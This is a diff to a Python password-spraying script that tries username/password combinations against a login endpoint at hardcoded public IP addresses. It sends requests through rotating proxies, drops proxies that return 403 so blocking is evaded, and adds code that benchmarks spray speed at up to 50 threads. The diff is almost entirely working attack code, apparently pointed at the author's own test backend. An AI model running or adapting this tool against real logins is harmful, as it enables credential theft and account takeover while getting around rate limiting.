@@ -14,6 +14,8 @@ print("Starting...")
 # Set the correct target URL for the login endpoint on your backend
 # url = "http://localhost:5050/login"
 url = 'http://50.19.17.226:5050/login'
+url = 'http://54.234.124.97:5050/login'
+
 
 # Define Header
 headers = {
@@ -145,17 +147,17 @@ def rotating_proxy(username, password):
                 print(f"[+] Successful login with {username}:{password} using proxy {proxies["http"]}")
                 return  # Exit on successful login
             elif login_response.status_code == 401:
-                print(f"[-] Failed login for {username}:{password} (401 Unauthorized) using proxy {proxies["http"]}")
+                # print(f"[-] Failed login for {username}:{password} (401 Unauthorized) using proxy {proxies["http"]}")
                 break  # No need to retry on a 401 error
             elif login_response.status_code == 403:
-                print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies["http"]}")
+                # print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies["http"]}")
                 # Remove the blocked proxy
                 with proxies_lock:
                     # proxies_list.remove(proxies)
                     delete_proxy_in_constant_time(proxies["http"])
                 retry_count += 1  # Increment retry count after a 403
             else:
-                print(f"[-] Other failure for {username}:{password} (Status Code: {login_response.status_code}) using proxy {proxies["http"]}")
+                # print(f"[-] Other failure for {username}:{password} (Status Code: {login_response.status_code}) using proxy {proxies["http"]}")
                 retry_count += 1
 
         except requests.RequestException as e:
@@ -163,14 +165,14 @@ def rotating_proxy(username, password):
             retry_count += 1  # Increment retry count on request error
         except Exception as e:
             # Handle any other exceptions that may occur
-            print(f"[-] An unexpected error occurred - Username: {username} and Password: {password} - {e}")
+            # print(f"[-] An unexpected error occurred - Username: {username} and Password: {password} - {e}")
             retry_count += 1  # Increment retry count on request error
 
         # Sleep or add a delay if needed
         # time.sleep(1)  # Optional, to avoid immediate re-requests
         # print(len(proxies_list))
 
-    print(f"Max retries reached for {username}:{password}")
+    # print(f"Max retries reached for {username}:{password}")
 
 
 # Function to perform password spraying using multithreading
@@ -182,6 +184,21 @@ def password_spray(usernames, passwords):
         for username in usernames:
             for password in passwords:
                 executor.submit(rotating_proxy, username, password)
+
+# Measure performance with different thread counts
+def measure_performance_for_multithreading(num_threads):
+    start_time = time.time()
+
+    # Using ThreadPoolExecutor with the specified number of threads
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        for username in usernames:
+            for password in passwords:
+                executor.submit(rotating_proxy, username, password)
+
+    end_time = time.time()
+    total_time = end_time - start_time
+
+    print(f"Threads: {num_threads}, Time taken: {total_time:.2f} seconds, Requests per second: {inputSize / total_time:.2f}")
 
 # Run the password spray
 if __name__ == "__main__":
@@ -200,6 +217,8 @@ if __name__ == "__main__":
     usernames = read_usernames(username_file_path)
     passwords = read_passwords(password_file_path)
 
+    inputSize = len(usernames)*len(passwords)
+
     # Initialize a session
     session = requests.Session()
 
@@ -213,8 +232,14 @@ if __name__ == "__main__":
     proxiesToIndex = {proxy["http"]: index for index, proxy in enumerate(proxies_list)}
 
     # Run the password spray
-    password_spray(usernames, passwords)
+    # UNCOMMENT THE CODE TO COUNT PERFORMANCE
+    # password_spray(usernames, passwords)
     time.sleep(2)
     print(len(proxies_list))
+
+    for threads in [1,2,5,10,20,50]:
+        measure_performance_for_multithreading(threads)
+    print(len(proxies_list))
+    
 
     
